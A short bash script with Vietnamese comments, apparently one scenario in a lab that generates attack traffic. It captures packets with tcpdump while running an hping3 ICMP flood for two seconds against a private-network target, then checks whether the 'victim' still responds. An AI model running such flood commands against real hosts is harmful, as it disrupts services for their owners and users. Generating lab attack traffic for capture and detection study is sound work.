#!/bin/bash
# Kịch bản 3: ICMP flood

TARGET="172.28.0.10"
IFACE="eth0"
DURATION=2

mkdir -p ../pcap
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="../pcap/03_icmp_flood_$TIME.pcap"

echo "Bắt đầu bắt gói tin, lưu vào $PCAP"
tcpdump -i $IFACE host $TARGET -w $PCAP &
PID=$!
sleep 2

echo "Chạy hping3 icmp flood trong $DURATION giây"
timeout $DURATION hping3 --icmp --flood $TARGET

sleep 3
kill $PID

echo "Xong rồi. Kiểm tra victim còn sống không: ping -c 3 $TARGET"
